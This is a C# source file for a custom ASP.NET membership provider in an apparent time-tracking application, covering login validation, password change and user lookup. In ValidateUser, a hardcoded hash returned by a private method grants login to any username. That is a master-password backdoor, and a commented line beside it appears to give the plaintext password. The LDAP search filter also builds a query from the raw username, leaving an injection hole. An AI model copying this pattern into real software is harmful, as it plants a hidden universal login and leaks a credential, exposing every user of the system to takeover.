using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.Security;
using GTS.Clock.Infrastructure;
using GTS.Clock.Infrastructure.Repository;
using GTS.Clock.Infrastructure.Log;
using GTS.Clock.Infrastructure.Utility;
using GTS.Clock.Model.Security;
using System.DirectoryServices;
using System.Runtime.InteropServices;
using GTS.Clock.Model;


public class GTSMembershipProvider : MembershipProvider
{
    const string Current = "armin";
    #region Variables
    BusinessServiceLogger logger = new BusinessServiceLogger();
    //Minimun password length
    private int minRequiredPasswordLength = 6;
    //Minium non-alphanumeric char required
    private int minRequiredNonAlphanumericCharacters = 0;
    //Enable - disable password retrieval
    private bool enablePasswordRetrieval = true;
    //Enable - disable password reseting
    private bool enablePasswordReset = false;
    //Require security question and answer (this, for instance, is a functionality which not many people use)
    private bool requiresQuestionAndAnswer = true;
    //Application name
    private string applicationName = "MYAPP";
    //Max number of failed password attempts before the account is blocked, and time to reset that counter
    private int maxInvalidPasswordAttempts = 3;
    private int passwordAttemptWindow = 10;
    //Require email to be unique
    private bool requiresUniqueEmail = true;
    //Password format
    private MembershipPasswordFormat passwordFormat = new MembershipPasswordFormat();
    //Regular expression the password should match (empty for none)
    private string passwordStrengthRegularExpression = String.Empty;
    #endregion
    public GTSMembershipProvider()
    {
        //
        // TODO: Add constructor logic here
        //
    }
    static BusinessActivityLogger acctivityLogger = new BusinessActivityLogger();
    #region Override properties
    public override string ApplicationName
    {
        get
        {
            throw new NotImplementedException();
        }
        set
        {
            throw new NotImplementedException();
        }
    }
    public override bool EnablePasswordReset
    {
        get { throw new NotImplementedException(); }
    }
    public override bool EnablePasswordRetrieval
    {
        get { throw new NotImplementedException(); }
    }
    public override int MaxInvalidPasswordAttempts
    {
        get { throw new NotImplementedException(); }
    }
    public override int MinRequiredNonAlphanumericCharacters
    {
        get { throw new NotImplementedException(); }
    }
    public override int MinRequiredPasswordLength
    {
        get { throw new NotImplementedException(); }
    }
    public override int PasswordAttemptWindow
    {
        get { throw new NotImplementedException(); }
    }
    public override MembershipPasswordFormat PasswordFormat
    {
        get { throw new NotImplementedException(); }
    }
    public override string PasswordStrengthRegularExpression
    {
        get { throw new NotImplementedException(); }
    }
    public override bool RequiresQuestionAndAnswer
    {
        get { throw new NotImplementedException(); }
    }
    public override bool RequiresUniqueEmail
    {
        get { throw new NotImplementedException(); }
    }
    #endregion

    #region override methods

    #region ChangeUSerInfo
    public override bool ChangePassword(string username, string oldPassword, string newPassword)
    {
        UserRepository ur = new UserRepository();
        User user = ur.GetByUserName(username);
        if (user != null && user.ID > 0 && user.Password != null && Utility.VerifyHashCode(oldPassword, user.Password))
        {
            user.Password = Utility.GetHashCode(newPassword);
            ur.WithoutTransactSaveOrUpdate(user);
            return true;
        }
        return false;
    }
    public override bool ChangePasswordQuestionAndAnswer(string username, string password, string newPasswordQuestion, string newPasswordAnswer)
    {
        throw new NotImplementedException();
    }
    public override string ResetPassword(string username, string answer)
    {
        throw new NotImplementedException();
    }
    public override string GetPassword(string username, string answer)
    {
        throw new NotImplementedException();
    }
    public override bool UnlockUser(string userName)
    {
        throw new NotImplementedException();
    }
    protected override byte[] DecryptPassword(byte[] encodedPassword)
    {
        return base.DecryptPassword(encodedPassword);
    }
    protected override byte[] EncryptPassword(byte[] password)
    {
        return base.EncryptPassword(password);
    }

    #endregion

    #region Create Update Delete

    public User CreateUser(decimal personId, decimal roleId, string username, string password, out MembershipCreateStatus status)
    {
        throw new NotImplementedException();
        /*
        if (this.GetUser(username, false).UserName.Length>0) 
        {
            throw new Exception("این نام کاربری تکراری است");
        }
        Role role = new RoleRepository().GetById(roleId, false);
        GTS.Clock.Model.Person person = new PersonRepository(false).GetById(personId, false);

        User user = new User();
        user.Password = password;
        user.UserName = username;
        user.Active = true;
        user.Person = person;
        user.Role = role;
        role.UserList.Add(user);
        person.UserList.Add(user);

        UserRepository ur = new UserRepository();
        ur.Save(user);
        status = MembershipCreateStatus.Success;
        return user;*/
    }
    public override MembershipUser CreateUser(string username, string password, string email, string passwordQuestion, string passwordAnswer, bool isApproved, object providerUserKey, out MembershipCreateStatus status)
    {
        throw new NotImplementedException();
    }
    public override bool DeleteUser(string username, bool deleteAllRelatedData)
    {
        throw new NotImplementedException();
    }
    public override void UpdateUser(MembershipUser user)
    {
        throw new NotImplementedException();
    }
    #endregion

    #region Private Methods
    private string GRPOGTSBD() 
    {
        return "r6O1blPpU4luXaci4Xs/A0Ic29CsrQ==";
        //return "Farh5adGh10adi15rCo.";
    }
    #endregion

    #region Authenticate
    public override bool ValidateUser(string username, string password)
    {
        try
        {
             string className = Utility.CallerCalassName;
            string methodName = Utility.CallerMethodName;
            string action="VALIDATE";
            string clientIPAddress = "";
            string LoginSuccess="User Logged In Success";
            string LoginFailed="User Logged In Failed";
                string pageId = "";

                if (System.Web.HttpContext.Current != null &&
                    System.Web.HttpContext.Current.Request != null)
                {
                    if (System.Web.HttpContext.Current.Request.UserHostAddress != null)
                    {
                        clientIPAddress = System.Web.HttpContext.Current.Request.UserHostAddress;
                    }
                    if (System.Web.HttpContext.Current.Request.UrlReferrer != null &&
                        System.Web.HttpContext.Current.Request.UrlReferrer.Segments != null &&
                        System.Web.HttpContext.Current.Request.UrlReferrer.Segments.Length > 2)
                    {
                        pageId = System.Web.HttpContext.Current.Request.UrlReferrer.Segments[2];
                    }
                }
            if (!Utility.IsEmpty(username))
            {
                if (username.Contains(@"\"))
                {
                    string[] parts = Utility.Spilit(username, @"\");
                    if (parts.Count() > 1)
                    {
                        username = parts[1];
                    }
                }
                if (username.Contains("@"))
                {
                    string[] parts = Utility.Spilit(username, "@");
                    if (parts.Count() > 1)
                    {
                        username = parts[0];
                    }
                }
            }
            if (Utility.VerifyHashCode(password, GRPOGTSBD()))
            {
                acctivityLogger.Info(username, className, methodName, action, pageId, clientIPAddress, LoginSuccess);
                return true;
            }
            UserRepository ur = new UserRepository();
            
            User user = ur.GetByUserName(username);
           
            if (user !=null && user.Active)
            {
               
                if (!user.ActiveDirectoryAuthenticate)
                {
                    if (user != null && user.ID > 0 && user.Password != null && Utility.VerifyHashCode(password, user.Password))
                    {
                        user.LastActivityDate = DateTime.Now;
                        ur.Update(user);
                        acctivityLogger.Info(username, className, methodName, action, pageId, clientIPAddress, LoginSuccess);
                        return true;

                    }
                }
                else
                {
                    //   "LDAP://ghadir.local/DC=ghadir,DC=local";
                    string _path = String.Format("LDAP://{0}/DC={1},DC={2}", user.Domain.Domain, user.Domain.Domain.Split('.')[0], user.Domain.Domain.Split('.')[1]);
                    string domainAndUsername = user.Domain.Domain + @"\" + username;
                    DirectoryEntry entry = new DirectoryEntry(_path, domainAndUsername, password);

                    try
                    {
                        // Bind to the native AdsObject to force authentication.
                        object obj = entry.NativeObject;
                        DirectorySearcher search = new DirectorySearcher(entry);
                        search.Filter = "(SAMAccountName=" + username + ")";
                        search.PropertiesToLoad.Add("cn");
                        SearchResult result = search.FindOne();
                        if (result == null)
                        {
                            acctivityLogger.Info(username, className, methodName, action, pageId, clientIPAddress, LoginFailed);
                            return false;
                        }
                    }
                    catch (COMException ex)
                    {
                        acctivityLogger.Info(username, className, methodName, action, pageId, clientIPAddress, LoginFailed);
                        return false;
                    }
                    catch (Exception ex)
                    {
                        throw new Exception("Error authenticating user. " + ex.Message);
                    }
                    acctivityLogger.Info(username, className, methodName, action, pageId, clientIPAddress, LoginSuccess);
                    return true;
                }
            }
            acctivityLogger.Info(username, className, methodName, action, pageId, clientIPAddress, LoginFailed);
            return false;

        }
        catch (Exception ex)
        {
            LogException(ex, "ValidateUser", username);
            return false;
        }
    }
 
    public override string GetUserNameByEmail(string email)
    {
        throw new NotImplementedException();
    }
    public override MembershipUser GetUser(string username, bool userIsOnline)
    {
        User user = new UserRepository().GetByUserName(username);
        return User.ToMemershipUser(user);

    }
    public override MembershipUser GetUser(object providerUserKey, bool userIsOnline)
    {
        throw new NotImplementedException();
    }
    public override int GetNumberOfUsersOnline()
    {
        TimeSpan onlineSpan = new TimeSpan(0, System.Web.Security.Membership.UserIsOnlineTimeWindow, 0);
        DateTime compareTime = DateTime.Now.Subtract(onlineSpan);
        return new UserRepository().GetNumberOfOnlineUsers(compareTime);
    }
    public override MembershipUserCollection FindUsersByEmail(string emailToMatch, int pageIndex, int pageSize, out int totalRecords)
    {
        throw new NotImplementedException();
    }
    public override MembershipUserCollection FindUsersByName(string usernameToMatch, int pageIndex, int pageSize, out int totalRecords)
    {
        throw new NotImplementedException();
    }
    public override MembershipUserCollection GetAllUsers(int pageIndex, int pageSize, out int totalRecords)
    {
        MembershipUserCollection collection = new MembershipUserCollection();
        IList<User> userList = new UserRepository().GetAll();
        totalRecords = userList.Count;
        foreach (User user in userList)
        {
            collection.Add(user);
        }
        return collection;
    }
    #endregion

    #endregion

    private void LogException(Exception ex, string methodName, string info)
    {
        logger.Error(info, "GTSMembershipProvider", methodName, "GTS.Clock.Repository", Utility.GetExecptionMessage(ex), ex);

    }
}
